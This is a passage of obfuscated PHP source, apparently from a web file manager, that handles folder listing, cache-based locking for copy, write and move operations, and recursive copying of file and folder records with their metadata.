explode($ù­›ùÃÉ[50], trim($§§öíµ, $ù­›ùÃÉ[50])); return array_remove_value($§§öíµ, $ù­›ùÃÉ[238]); } public function listAll($Ğ‚°×á°) { $Õ†¶¤Ô =& $_SERVER[è¶³ÒßÑ]; $¡®±£¼Ø = $this->sourceInfo($Ğ‚°×á°); $Â–‘¬› = array($Õ†¶¤Ô[604] => array($Õ†¶¤Ô[605], $¡®±£¼Ø[$Õ†¶¤Ô[577]] . $Ğ‚°×á° . $Õ†¶¤Ô[606]), $Õ†¶¤Ô[607] => 0); $òÁíó¾ = $Õ†¶¤Ô[608]; $Ê×½šö¸ = "\x4c\x45\106\x54\40\x4a\x4f\x49\116\40{$this->tablePrefix}\151\157\x5f\146\x69\x6c\x65\x20\146\151\x6c\x65\x20\x6f\156\x20\x73\157\x75\162\143\145\56\x66\151\x6c\145\111\x44\x20\x3d\x20\x66\x69\154\145\x2e\146\151\x6c\145\111\x44"; $ÖàÖ°–‰ = $this->alias($Õ†¶¤Ô[512])->field($òÁíó¾)->where($Â–‘¬›)->join($Ê×½šö¸)->select(); $this->_listAppendAuth($ÖàÖ°–‰); $this->_listAppendUser($ÖàÖ°–‰); $this->_listAppendPath($ÖàÖ°–‰); $ÖàÖ°–‰ = array_to_keyvalue($ÖàÖ°–‰, $Õ†¶¤Ô[203]); $™¥°ÍÙ„ = "\57{$¡®±£¼Ø[$Õ†¶¤Ô[32]]}\57"; $™¥°ÍÙ„ = $™¥°ÍÙ„ == $Õ†¶¤Ô[585] ? $Õ†¶¤Ô[8] : $™¥°ÍÙ„; $ÄîéêÀ = array(); foreach ($ÖàÖ°–‰ as $ñšó°š¼ => $ÆòöâÈ») { $ç­ßĞ÷Ê = $this->parentLevelArray($ÆòöâÈ»[$Õ†¶¤Ô[577]]); array_shift($ç­ßĞ÷Ê); $È¾·ÂÎË = $™¥°ÍÙ„; for ($Â©é»Ãï = 0; $Â©é»Ãï < count($ç­ßĞ÷Ê); $Â©é»Ãï++) { $È¾·ÂÎË .= $ÖàÖ°–‰[$ç­ßĞ÷Ê[$Â©é»Ãï]][$Õ†¶¤Ô[32]] . $Õ†¶¤Ô[8]; } $È¾·ÂÎË .= $ÆòöâÈ»[$Õ†¶¤Ô[32]]; if ($ÆòöâÈ»[$Õ†¶¤Ô[478]]) { $È¾·ÂÎË .= $Õ†¶¤Ô[8]; } $¢“ëöÔ¯ = array($Õ†¶¤Ô[488] => str_replace($Õ†¶¤Ô[585], $Õ†¶¤Ô[8], str_replace($Õ†¶¤Ô[585], $Õ†¶¤Ô[8], str_replace($Õ†¶¤Ô[585], $Õ†¶¤Ô[8], $È¾·ÂÎË))), $Õ†¶¤Ô[609] => intval($ÆòöâÈ»[$Õ†¶¤Ô[478]]), $Õ†¶¤Ô[610] => intval($ÆòöâÈ»[$Õ†¶¤Ô[89]]), $Õ†¶¤Ô[98] => intval($ÆòöâÈ»[$Õ†¶¤Ô[98]]), $Õ†¶¤Ô[100] => $this->pathInfoFilter($ÆòöâÈ»)); if (!$¢“ëöÔ¯[$Õ†¶¤Ô[478]]) { $¢“ëöÔ¯[$Õ†¶¤Ô[534]] = $ÆòöâÈ»[$Õ†¶¤Ô[534]]; } $ÄîéêÀ[] = $¢“ëöÔ¯; } $ÄîéêÀ = array_sort_by($ÄîéêÀ, $Õ†¶¤Ô[97]); return $ÄîéêÀ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ôˆ†ğóÈ) { $ Ïòàò÷ =& $_SERVER[è¶³ÒßÑ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ Ïòàò÷[611], $ôˆ†ğóÈ); $áùºş¢š = 1; $this->_lockEvent($ôˆ†ğóÈ, array($ Ïòàò÷[612], $ Ïòàò÷[613]), $áùºş¢š); $this->_lockParent($ôˆ†ğóÈ, array($ Ïòàò÷[613]), $áùºş¢š); $this->_lockEvent($ôˆ†ğóÈ, array($ Ïòàò÷[614], $ Ïòàò÷[615]), $áùºş¢š); $this->_lockCheckEnd($ Ïòàò÷[611], $ôˆ†ğóÈ); } public function lockCopyEnd($¨¿ŒÖÃ³) { $—¼„¯ø¬ =& $_SERVER[è¶³ÒßÑ]; if (!$this->allowLock()) { return; } $¬¬°‘õ„ = 0; $this->_lockEvent($¨¿ŒÖÃ³, array($—¼„¯ø¬[612], $—¼„¯ø¬[613]), $¬¬°‘õ„); $this->_lockParent($¨¿ŒÖÃ³, array($—¼„¯ø¬[613]), $¬¬°‘õ„); $this->_lockEvent($¨¿ŒÖÃ³, array($—¼„¯ø¬[614], $—¼„¯ø¬[615]), $¬¬°‘õ„); } public function lockWriteStart($ÕÀŸŠª, $¡Şì×Ç„ = '') { $¶Í«õ° =& $_SERVER[è¶³ÒßÑ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¶Í«õ°[612], $ÕÀŸŠª); $·Šú©Šâ = 1; $this->_lockKey($¶Í«õ°[616] . $ÕÀŸŠª . $¶Í«õ°[10] . $¡Şì×Ç„, $·Šú©Šâ); $this->_lockEvent($ÕÀŸŠª, array($¶Í«õ°[611], $¶Í«õ°[613]), $·Šú©Šâ); $this->_lockParent($ÕÀŸŠª, array($¶Í«õ°[611], $¶Í«õ°[613]), $·Šú©Šâ); $this->_lockCheckEnd($¶Í«õ°[612], $ÕÀŸŠª); } public function lockWriteEnd($×›ÈÉÈ¢, $ÕÒáã” = '') { $Öè½ Ã¸ =& $_SERVER[è¶³ÒßÑ]; if (!$this->allowLock()) { return; } $¾©³–À— = 0; $this->_lockKey($Öè½ Ã¸[616] . $×›ÈÉÈ¢ . $Öè½ Ã¸[10] . $ÕÒáã”, $¾©³–À—); $this->_lockEvent($×›ÈÉÈ¢, array($Öè½ Ã¸[611], $Öè½ Ã¸[613]), $¾©³–À—); $this->_lockParent($×›ÈÉÈ¢, array($Öè½ Ã¸[611], $Öè½ Ã¸[613]), $¾©³–À—); } public function lockMoveStart($™ÏªØÓĞ) { $ëè©’Å¬ =& $_SERVER[è¶³ÒßÑ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ëè©’Å¬[613], $™ÏªØÓĞ); $¢ğş‘™À = 1; $this->_lockKey($ëè©’Å¬[617] . $™ÏªØÓĞ, $¢ğş‘™À); $this->_lockEvent($™ÏªØÓĞ, array($ëè©’Å¬[611], $ëè©’Å¬[612]), $¢ğş‘™À); $this->_lockParent($™ÏªØÓĞ, array($ëè©’Å¬[611], $ëè©’Å¬[613]), $¢ğş‘™À); $this->_lockEvent($™ÏªØÓĞ, array($ëè©’Å¬[618], $ëè©’Å¬[614], $ëè©’Å¬[615]), $¢ğş‘™À); $this->_lockCheckEnd($ëè©’Å¬[613], $™ÏªØÓĞ); } public function lockMoveEnd($å­——ïÜ) { $¾¡¹„´° =& $_SERVER[è¶³ÒßÑ]; if (!$this->allowLock()) { return; } $æ¦§äµ¬ = 0; $this->_lockKey($¾¡¹„´°[617] . $å­——ïÜ, $æ¦§äµ¬); $this->_lockEvent($å­——ïÜ, array($¾¡¹„´°[611], $¾¡¹„´°[612]), $æ¦§äµ¬); $this->_lockParent($å­——ïÜ, array($¾¡¹„´°[611], $¾¡¹„´°[613]), $æ¦§äµ¬); $this->_lockEvent($å­——ïÜ, array($¾¡¹„´°[618], $¾¡¹„´°[614], $¾¡¹„´°[615]), $æ¦§äµ¬); } private function _lockCheck($Ä¾©…, $ˆ‹Ÿä„ü) { $¥•¤˜Ï =& $_SERVER[è¶³ÒßÑ]; $ú¥Ìçê = $this->sourceInfo($ˆ‹Ÿä„ü); $ğíÏúÌ¼ = $Ä¾©… . $¥•¤˜Ï[10] . $ˆ‹Ÿä„ü; $this->_lockTimeStart[$ğíÏúÌ¼] = timeFloat(); if (!is_array($ú¥Ìçê)) { return; } $’‘¸‡’ = LNG($¥•¤˜Ï[619]); CacheLock::setErrorMsg($¥•¤˜Ï[186] . htmlspecialchars($ú¥Ìçê[$¥•¤˜Ï[32]]) . $¥•¤˜Ï[188] . $’‘¸‡’); $this->_lockKey($ğíÏúÌ¼, 1); $this->_lockKey($ğíÏúÌ¼, 0); $Õ‰Ó¢©© = array_reverse($this->parentLevelArray($ú¥Ìçê[$¥•¤˜Ï[577]])); foreach ($Õ‰Ó¢©© as $Ü³ğà’Ğ) { $ğíÏúÌ¼ = $Ä¾©… . $¥•¤˜Ï[620] . $Ü³ğà’Ğ; if (CacheLock::lockGet($¥•¤˜Ï[621] . $ğíÏúÌ¼)) { $ú¥Ìçê = $this->sourceInfo($Ü³ğà’Ğ); CacheLock::setErrorMsg($¥•¤˜Ï[186] . htmlspecialchars($ú¥Ìçê[$¥•¤˜Ï[32]]) . $¥•¤˜Ï[188] . $’‘¸‡’); $this->_lockKey($ğíÏúÌ¼, 1); $this->_lockKey($ğíÏúÌ¼, 0); } } } private function _lockCheckEnd($ÊïŠØ»Š, $ÈÆ¦Å¾) { $»Ä½ƒÆ¼ =& $_SERVER[è¶³ÒßÑ]; $œŸœİÉİ = $ÊïŠØ»Š . $»Ä½ƒÆ¼[10] . $ÈÆ¦Å¾; CacheLock::setErrorMsg($»Ä½ƒÆ¼[447]); if (!isset($this->_lockTimeStart[$œŸœİÉİ])) { return; } $Ç­™âı› = timeFloat() - $this->_lockTimeStart[$œŸœİÉİ]; unset($this->_lockTimeStart[$œŸœİÉİ]); if ($Ç­™âı› > 0.5) { unset(self::$cacheSourceInfo[$»Ä½ƒÆ¼[526] . $ÈÆ¦Å¾]); } $˜£±Û¹Î = $this->sourceInfo($ÈÆ¦Å¾); if (!$˜£±Û¹Î) { show_json(LNG($»Ä½ƒÆ¼[118]), !1); } } private function _lockParent($ùñ¹Ö°Ô, $¼È °ñÅ, $É‰¬Ó–Î) { if (!$this->autoLockSet) { return; } $ëìù¸»ë = $this->sourceInfo($ùñ¹Ö°Ô); if (!is_array($ëìù¸»ë)) { return; } $ÃÜ¼‚øÅ = array_reverse($this->parentLevelArray($ëìù¸»ë[$_SERVER[è¶³ÒßÑ][577]])); foreach ($ÃÜ¼‚øÅ as $¼é¢ĞğØ) { $this->_lockEvent($¼é¢ĞğØ, $¼È °ñÅ, $É‰¬Ó–Î); } } private function _lockEvent($±àœÅˆ±, $Óò ¤á, $ªµĞÊÎì) { $ÑİÜŸà© =& $_SERVER[è¶³ÒßÑ]; if (!$this->autoLockSet) { return; } foreach ($Óò ¤á as $Ø€ŞìÅ™) { $Ùœ°¾¢Ó = $Ø€ŞìÅ™ . $ÑİÜŸà©[10] . $±àœÅˆ±; if ($ªµĞÊÎì && CacheLock::lockGet($ÑİÜŸà©[621] . $Ùœ°¾¢Ó)) { continue; } $this->_lockKey($Ùœ°¾¢Ó, $ªµĞÊÎì); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($±Ô«ş°, $ê›ÆÀ×¬ = 1) { $ßĞíâŸ¥ = $_SERVER[è¶³ÒßÑ][621] . md5($±Ô«ş°); if ($ê›ÆÀ×¬) { if (isset(self::$_lockItemArr[$ßĞíâŸ¥])) { return; } self::$_lockItemArr[$ßĞíâŸ¥] = 1; CacheLock::lock($ßĞíâŸ¥, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ßĞíâŸ¥])) { return; } unset(self::$_lockItemArr[$ßĞíâŸ¥]); CacheLock::unlock($ßĞíâŸ¥); } } public function isParentOf($Ëïá÷, $Ä²é…ıÅ) { $ùëé¸Æ™ =& $_SERVER[è¶³ÒßÑ]; $ ï“¿ìğ = $this->sourceInfo($Ëïá÷); $Ìñİğê = $this->sourceInfo($Ä²é…ıÅ); $±ãÓ£¬ = $ ï“¿ìğ[$ùëé¸Æ™[577]] . $ ï“¿ìğ[$ùëé¸Æ™[203]] . $ùëé¸Æ™[50]; $µ‹ï«Ä° = $Ìñİğê[$ùëé¸Æ™[577]] . $Ìñİğê[$ùëé¸Æ™[203]] . $ùëé¸Æ™[50]; $ïìÕÏÇç = strpos($µ‹ï«Ä°, $±ãÓ£¬) === 0; return $ïìÕÏÇç; } private $targetIsDelete = 0; public function copy($ÃÈ•¡ò’, $²ƒë·ç†, $Ç¬Àß€— = REPEAT_REPLACE, $Ş÷È±Ã = '') { $˜ò±¢¥ç =& $_SERVER[è¶³ÒßÑ]; $ÙÜœ®¥¯ = $this->sourceInfo($ÃÈ•¡ò’); $ß´ÚõÇÃ = $this->sourceInfo($²ƒë·ç†); if (!$ÙÜœ®¥¯ || !$ß´ÚõÇÃ || $ß´ÚõÇÃ[$˜ò±¢¥ç[478]] != $˜ò±¢¥ç[101]) { return !1; } if ($this->isParentOf($ÃÈ•¡ò’, $²ƒë·ç†)) { return !1; } $—ßÀ¢§İ = $Ş÷È±Ã ? $Ş÷È±Ã : $ÙÜœ®¥¯[$˜ò±¢¥ç[32]]; $this->lockCopyStart($ÃÈ•¡ò’); $this->lockWriteStart($²ƒë·ç†, $—ßÀ¢§İ); $µ¢»ËáÙ = array($˜ò±¢¥ç[622] => array(), $˜ò±¢¥ç[623] => array(), $˜ò±¢¥ç[624] => array()); $this->targetIsDelete = intval($ÙÜœ®¥¯[$˜ò±¢¥ç[498]]); $¯Ö»œî = $this->fileNameExistAuto($²ƒë·ç†, $ÙÜœ®¥¯); $÷¨•ÚîÁ = $this->_copy($ÃÈ•¡ò’, $²ƒë·ç†, $Ç¬Àß€—, $µ¢»ËáÙ, !0, $Ş÷È±Ã); $this->_childrenListClear(); $this->lockCopyEnd($ÃÈ•¡ò’); $this->lockWriteEnd($²ƒë·ç†, $—ßÀ¢§İ); if ($ÙÜœ®¥¯[$˜ò±¢¥ç[478]] == $˜ò±¢¥ç[101] && $¯Ö»œî == $÷¨•ÚîÁ) { $this->folderSizeResetChildren($¯Ö»œî); } Model($˜ò±¢¥ç[625])->addAll($µ¢»ËáÙ[$˜ò±¢¥ç[623]], array(), !0); if ($¯Ö»œî != $÷¨•ÚîÁ || $ÙÜœ®¥¯[$˜ò±¢¥ç[478]] == $˜ò±¢¥ç[101]) { Model($˜ò±¢¥ç[626])->eventCopy($÷¨•ÚîÁ); } $this->saveAll($µ¢»ËáÙ[$˜ò±¢¥ç[624]]); Model($˜ò±¢¥ç[240])->linkAdd($µ¢»ËáÙ[$˜ò±¢¥ç[622]]); $this->folderSizeReset($²ƒë·ç†); $this->updateModifyTime($²ƒë·ç†); return $÷¨•ÚîÁ; } private function _copy($£ĞÀèû, $’¢†Ò·’, $¡Íõ•, &$œší¥…°, $˜³ñÑ–, $ŸÈÏÉÅ£ = '') { $ÓŠÎÀ•ó =& $_SERVER[è¶³ÒßÑ]; $ıÛÂ£°È = $this->sourceInfoCache($£ĞÀèû); $ÙæÃ¹€ = $ıÛÂ£°È[$ÓŠÎÀ•ó[478]] == $ÓŠÎÀ•ó[101]; $†¶ö®À÷ = $ŸÈÏÉÅ£ ? $ŸÈÏÉÅ£ : $ıÛÂ£°È[$ÓŠÎÀ•ó[32]]; $ã¾Æ«ıÎ = $this->fileNameExistAuto($’¢†Ò·’, $ıÛÂ£°È); if ($˜³ñÑ–) { $this->_childrenAllMake($£ĞÀèû); if ($ÙæÃ¹€ && $ã¾Æ«ıÎ) { $this->_childrenAllMake($ã¾Æ«ıÎ); } } if (!$ã¾Æ«ıÎ) { return $this->_copyCreate($£ĞÀèû, $’¢†Ò·’, $†¶ö®À÷, $œší¥…°); } $Ô±Ç´¼Ø = $ã¾Æ«ıÎ; if ($ÙæÃ¹€) { if ($¡Íõ• == REPEAT_RENAME_FOLDER) { $†¶ö®À÷ = $this->fileNameAutoCache($’¢†Ò·’, $†¶ö®À÷, $¡Íõ•, $ÙæÃ¹€); $Ô±Ç´¼Ø = $this->_copyCreate($£ĞÀèû, $’¢†Ò·’, $†¶ö®À÷, $œší¥…°); } else { $Ó œÜÊœ = $this->_childrenList($£ĞÀèû); foreach ($Ó œÜÊœ as $ñë’ÆÔá) { $this->_copy($ñë’ÆÔá[$ÓŠÎÀ•ó[203]], $ã¾Æ«ıÎ, $¡Íõ•, $œší¥…°, !1); } } } else { if ($¡Íõ• == REPEAT_RENAME || $¡Íõ• == REPEAT_RENAME_FOLDER) { $†¶ö®À÷ = $this->fileNameAutoCache($’¢†Ò·’, $†¶ö®À÷, $¡Íõ•, $ÙæÃ¹€); $Ô±Ç´¼Ø = $this->_copyCreate($£ĞÀèû, $’¢†Ò·’, $†¶ö®À÷, $œší¥…°); } else { if ($¡Íõ• == REPEAT_REPLACE) { $ŒÕí€¤Ï = $this->sourceInfoCache($ã¾Æ«ıÎ); $ ¿šô­Ì = $this->fileHistory($ŒÕí€¤Ï, $ıÛÂ£°È[$ÓŠÎÀ•ó[534]], $ıÛÂ£°È[$ÓŠÎÀ•ó[89]]); if ($ ¿šô­Ì) { $œší¥…°[$ÓŠÎÀ•ó[622]][] = $ıÛÂ£°È[$ÓŠÎÀ•ó[534]]; } } else { if ($¡Íõ• == REPEAT_SKIP) { } } } Hook::trigger($ÓŠÎÀ•ó[627], array($ÓŠÎÀ•ó[628], $ıÛÂ£°È, 0)); } return $Ô±Ç´¼Ø; } private function _copyCreate($ïÌ‘À¹Ä, $Ñ™ôÂö, $ç±òÊ¶, &$Şûª£Ê¢) { $œø´ûíÃ =& $_SERVER[è¶³ÒßÑ]; $‰ò…Îş· = $this->sourceInfoCache($ïÌ‘À¹Ä); $éè”ò¤™ = $this->sourceInfoCache($Ñ™ôÂö); $“‘ñû‹š = $this->_makeItemData($‰ò…Îş·, $éè”ò¤™, $ç±òÊ¶); Hook::trigger($œø´ûíÃ[629], $“‘ñû‹š); Hook::trigger($œø´ûíÃ[630], array($œø´ûíÃ[631], $“‘ñû‹š, 0)); $»â½ŸÔë = $this->add($“‘ñû‹š); $°‘¸ÊŞÏ = array($œø´ûíÃ[203] => $»â½ŸÔë, $œø´ûíÃ[32] => $ç±òÊ¶); $this->_copyApplyMeta($°‘¸ÊŞÏ, $Şûª£Ê¢); if ($‰ò…Îş·[$œø´ûíÃ[478]] != $œø´ûíÃ[101]) { $Şûª£Ê¢[$œø´ûíÃ[622]][] = $‰ò…Îş·[$œø´ûíÃ[534]]; return $»â½ŸÔë; } $™Ø»¯Õ‹ = array(); $¦ûÕ®ŠØ = array(); $this->_childrenListAll($ïÌ‘À¹Ä, $™Ø»¯Õ‹); $Ÿ˜‚ªÖØ = count($™Ø»¯Õ‹); if ($Ÿ˜‚ªÖØ == 0) { return $»â½ŸÔë; } $ß¬–ñ¢´ = $this->sourceInfo($»â½ŸÔë); foreach ($™Ø»¯Õ‹ as $à¯Í€´) { $“—Ô¬€™ = $this->_makeItemData($à¯Í€´, $ß¬–ñ¢´, $à¯Í€´[$œø´ûíÃ[32]]); $“—Ô¬€™[$œø´ûíÃ[577]] = $à¯Í€´[$œø´ûíÃ[577]]; $¦ûÕ®ŠØ[] = $“—Ô¬€™; } $this->chunkEventSet($œø´ûíÃ[632], array($œø´ûíÃ[633], $“‘ñû‹š, $Ÿ˜‚ªÖØ)); $this->addAll($¦ûÕ®ŠØ, array(), !1); $ÜÍƒ ñ¡ = $this->where(array($œø´ûíÃ[202] => $»â½ŸÔë))->select(); $İ–ß¤´­ = $this->_childrenMakeRelation($™Ø»¯Õ‹, $ÜÍƒ ñ¡); $İ–ß¤´­[$ïÌ‘À¹Ä] = $»â½ŸÔë; $†…ÉÒ“º = array(); $¤×›ß¸… = array(); foreach ($ÜÍƒ ñ¡ as $à¯Í€´) { $Ü¥¢ŒÜÂ = $à¯Í€´[$œø´ûíÃ[203]]; $®ÒÖ³û = $this->_childrenMatch($İ–ß¤´­, $à¯Í€´, $ß¬–ñ¢´); $†…ÉÒ“º[] = array($œø´ûíÃ[203], $Ü¥¢ŒÜÂ, $œø´ûíÃ[202], $®ÒÖ³û[$œø´ûíÃ[202]]); $¤×›ß¸…[] = array($œø´ûíÃ[203], $Ü¥¢ŒÜÂ, $œø´ûíÃ[577], $®ÒÖ³û[$œø´ûíÃ[577]]); $this->_copyApplyMeta($à¯Í€´, $Şûª£Ê¢); if ($à¯Í€´[$œø´ûíÃ[478]] != $œø´ûíÃ[101]) { $Şûª£Ê¢[$œø´ûíÃ[622]][] = $à¯Í€´[$œø´ûíÃ[534]]; } } $this->chunkEventSet($œø´ûíÃ[634], array($œø´ûíÃ[635], $“‘ñû‹š, $Ÿ˜‚ªÖØ)); $this->saveAll($†…ÉÒ“º); $this->chunkEventSet($œø´ûíÃ[636], array($œø´ûíÃ[637], $“‘ñû‹š, $Ÿ˜‚ªÖØ)); $this->saveAll($¤×›ß¸…); return $»â½ŸÔë; } private function _childrenMakeRelation($’½²ºÑ°, $È‹‰‘ùš) { $àÓ ‰†ş =& $_SERVER[è¶³ÒßÑ]; $Ø¿Ø·¦Š = array(); $£¤éÀØ² = array(); foreach ($’½²ºÑ° as $±ßÂ»ªÌ) { $Ãú¬š¸ = $±ßÂ»ªÌ[$àÓ ‰†ş[32]] . $àÓ ‰†ş[8] . $±ßÂ»ªÌ[$àÓ ‰†ş[577]]; $Ø¿Ø·¦Š[$Ãú¬š¸] = $±ßÂ»ªÌ[$àÓ ‰†ş[203]]; } foreach ($È‹‰‘ùš as $±ßÂ»ªÌ) { $Ãú¬š¸ = $±ßÂ»ªÌ[$àÓ ‰†ş[32]] . $àÓ ‰†ş[8] . $±ßÂ»ªÌ[$àÓ ‰†ş[577]]; $“Û×‚ˆä = $Ø¿Ø·¦Š[$Ãú¬š¸]; $£¤éÀØ²[$“Û×‚ˆä] = $±ßÂ»ªÌ[$àÓ ‰†ş[203]]; } return $£¤éÀØ²; } private function _childrenMatch($ÃÃÒ¾ü, $Èô®¸š¼, $íöèÂÍ¨) { $ıåÕ÷• =& $_SERVER[è¶³ÒßÑ]; $î€ÎØ·Ô = $íöèÂÍ¨[$ıåÕ÷•[577]]; $Ú—¡Úì = $this->parentLevelArray($Èô®¸š¼[$ıåÕ÷•[577]]); foreach ($Ú—¡Úì as $ìù«É÷) { if (isset($ÃÃÒ¾ü[$ìù«É÷])) { $î€ÎØ·Ô .= $ÃÃÒ¾ü[$ìù«É÷] . $ıåÕ÷•[638]; } } $î€ÎØ·Ô = rtrim($î€ÎØ·Ô, $ıåÕ÷•[50]) . $ıåÕ÷•[50]; $øğâíë = $this->parentLevelArray($î€ÎØ·Ô); $Ôæ¾¾úº = $øğâíë[count($øğâíë) - 1]; return array($ıåÕ÷•[202] => $Ôæ¾¾úº, $ıåÕ÷•[577] => $î€ÎØ·Ô); } private function _makeItemData($ø•Ì÷şğ, $ñÔüÚğÍ, $å¥†çÏä) { $­é§ËúÎ =& $_SERVER[è¶³ÒßÑ]; $©Ã„à·õ = array($­é§ËúÎ[639] => $ø•Ì÷şğ[$­é§ËúÎ[478]], $­é§ËúÎ[487] => $å¥†çÏä, $­é§ËúÎ[640] => $ø•Ì÷şğ[$­é§ËúÎ[479]] ? $ø•Ì÷şğ[$­é§ËúÎ[479]] : $­é§ËúÎ[12], $­é§ËúÎ[535] => $ø•Ì÷şğ[$­é§ËúÎ[534]] ? $ø•Ì÷şğ[$­é§ËúÎ[534]] : 0, $­é§ËúÎ[610] => $ø•Ì÷şğ[$­é§ËúÎ[89]] ? $ø•Ì÷şğ[$­é§ËúÎ[89]] : 0, $­é§ËúÎ[641] => intval($ñÔüÚğÍ[$­é§ËúÎ[200]]), $­é§ËúÎ[642] => intval($ñÔüÚğÍ[$­é§ËúÎ[562]]), $­é§ËúÎ[643] => intval(USER_ID), $­é§ËúÎ[644] => intval(USER_ID), $­é§ËúÎ[470] => intval($ñÔüÚğÍ[$­é§ËúÎ[203]]), $­é§ËúÎ[645] => $ñÔüÚğÍ[$­é§ËúÎ[577]] . $ñÔüÚğÍ[$­é§ËúÎ[203]] . $­é§ËúÎ[50], $­é§ËúÎ[491] => $ø•Ì÷şğ[$­é§ËúÎ[98]] ? $ø•Ì÷şğ[$­é§ËúÎ[98]] : time(), $­é§ËúÎ[497] => 0, $­é§ËúÎ[646] => $­é§ËúÎ[12]); return $©Ã„à·õ; } private function _copyApplyMeta($¨õ¾ÕÉ, &$Ä’¾¹ı¼) { $ÈÔ•Ÿ¦İ =& $_SERVER[è¶³ÒßÑ]; $®Ó‡ÔŸä = $¨õ¾ÕÉ[$ÈÔ•Ÿ¦İ[203]]; $æËğÌãÛ = $¨õ¾ÕÉ[$ÈÔ•Ÿ¦İ[32]]; if (!isset($¨õ¾ÕÉ[$ÈÔ•Ÿ¦İ[647]]) || !$¨õ¾ÕÉ[$ÈÔ•Ÿ¦İ[647]] || $¨õ¾ÕÉ[$ÈÔ•Ÿ¦İ[647]] == $ÈÔ•Ÿ¦İ[238]) { $Ä’¾¹ı¼[$ÈÔ•Ÿ¦İ[624]][] = array($ÈÔ•Ÿ¦İ[203], $®Ó‡ÔŸä, $ÈÔ•Ÿ¦İ[647], short_id($®Ó‡ÔŸä)); } if (Input::check($æËğÌãÛ, $ÈÔ•Ÿ¦İ[648])) { $Ä’¾¹ı¼[$ÈÔ•Ÿ¦İ[623]][] = array($ÈÔ•Ÿ¦İ[203] => $®Ó‡ÔŸä, $ÈÔ•Ÿ¦İ[107] => $ÈÔ•Ÿ¦İ[531], $ÈÔ•Ÿ¦İ[443] => str_replace($ÈÔ•Ÿ¦İ[53], $ÈÔ•Ÿ¦İ[12], Pinyin::get($æËğÌãÛ))); $Ä’¾¹ı¼[$ÈÔ•Ÿ¦İ[623]][] = array($ÈÔ•Ÿ¦İ[203] => $®Ó‡ÔŸä, $ÈÔ•Ÿ¦İ[107] => $ÈÔ•Ÿ¦İ[530], $ÈÔ•Ÿ¦İ[443] => Pinyin::get($æËğÌãÛ, $ÈÔ•Ÿ¦İ[649])); } $Ä’¾¹ı¼[$ÈÔ•Ÿ¦İ[623]][] = array($ÈÔ•Ÿ¦İ[203] => $®Ó‡ÔŸä, $ÈÔ•Ÿ¦İ[107] => $ÈÔ•Ÿ¦İ[510], $ÈÔ•Ÿ¦İ[443] => KodSort::makeStr($æËğÌãÛ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($‰ĞÚíì) { $¡Ø‘—õü =& $_SERVER[è¶³ÒßÑ]; $à¯Ó´ß˜ = $this->sourceInfo($‰ĞÚíì); $ü‰Úı = $¡Ø‘—õü[650]; $êÀèÍó = array($¡Ø‘—õü[577] => array($¡Ø‘—õü[605], $à¯Ó´ß˜[$¡Ø‘—õü[577]] . $‰ĞÚíì . $¡Ø‘—õü[606]), $¡Ø‘—õü[498] => $this->targetIsDelete); $äÀ€±µ  = $this->field($ü‰Úı)->where($êÀèÍó)->select(); if (!$äÀ€±µ ) { return; } $äÀ€±µ  = array_to_keyvalue($äÀ€±µ , $¡Ø‘—õü[203]); foreach ($äÀ€±µ  as $´ù•İ³ª) { $¨¸Îü° = $´ù•İ³ª[$¡Ø‘—õü[202]]; $‰ĞÚíì = $´ù•İ³ª[$¡Ø‘—õü[203]]; if (!isset($this->_childrenListCache[$‰ĞÚíì]) && $´ù•İ³ª[$¡Ø‘—õü[478]] == $¡Ø‘—õü[101]) { $this->_childrenListCache[$‰ĞÚíì] = array(); } if (!isset($this->_childrenListCache[$¨¸Îü°])) { $this->_childrenListCache[$¨¸Îü°] = array(); } $this->_childrenListCache[$¨¸Îü°][$‰ĞÚíì] = $´ù•İ³ª; $this->_childrenItemCache[$‰ĞÚíì] = $´ù•İ³ª; } } private function _childrenListAll($Ğ£òÈ¼©, &$”„Ú³Ó) { $ğş©æúƒ =& $_SERVER[è¶³ÒßÑ]; if (!isset($this->_childrenListCache[$Ğ£òÈ¼©])) { return; } $ñĞ±…òÙ = $this->_childrenListCache[$Ğ£òÈ¼©]; foreach ($ñĞ±…òÙ as $ˆÜÈºØ => $Á—èƒ) { $”„Ú³Ó[$ˆÜÈºØ] = $Á—èƒ; if ($Á—èƒ[$ğş©æúƒ[478]] == $ğş©æúƒ[101]) { $this->_childrenListAll($ˆÜÈºØ, $”„Ú³Ó); } } } private function sourceInfoCache($’¦š×Ú™) { if (isset($this->_childrenItemCache[$’¦š×Ú™])) { return $this->_childrenItemCache[$’¦š×Ú™]; } return $this->sourceInfo($’¦š×Ú™); } private function _childrenList($×îêâÒ¬) { if (isset($this->_childrenListCache[$×îêâÒ¬])) { return $this->_childrenListCache[$×îêâÒ¬]; } return $this->_childrenListSelect($×îêâÒ¬); } private function _childrenListSelect($£¬ßƒı¯) { $ŸäŞ¥õ =& $_SERVER[è¶³ÒßÑ]; $­¨Êú€Ò = array($ŸäŞ¥õ[202] => $£¬ßƒı¯, $ŸäŞ¥õ[498] => $this->targetIsDelete); $ö“ÊŒ° = $this->where($­¨Êú€Ò)->select(); $ö“ÊŒ° = $ö“ÊŒ° ? $ö“ÊŒ° : array(); $Œ ¢¿û¼ = array_to_keyvalue($ö“ÊŒ°, $ŸäŞ¥õ[203]); $this->_childrenListCache[$£¬ßƒı¯] = $Œ ¢¿û¼; foreach ($Œ ¢¿û¼ as $£¬ßƒı¯ => $ğƒ«õ·) { $this->_childrenItemCache[$£¬ßƒı¯] = $ğƒ«õ·; } return $Œ ¢¿û¼; } private function fileNameExistAuto($–úÎ§ãé, $º©Üéëü) { $Â€â¾ó =& $_SERVER[è¶³ÒßÑ]; if ($º©Üéëü[$Â€â¾ó[498]] == $Â€â¾ó[101]) { return $this->fileNameExist($–úÎ§ãé, $º©Üéëü[$Â€â¾ó[32]]); } return $this->fileNameExistCache($–úÎ§ãé, $º©Üéëü[$Â€â¾ó[32]]); } private function fileNameExistCache($‰ç“À“«, $©ôäÌúœ) { $ì™šúô· =& $_SERVER[è¶³ÒßÑ]; $©ôäÌúœ = strtolower($©ôäÌúœ); $ü§ü¯¶Ÿ = $this->_childrenList($‰ç“À“«); foreach 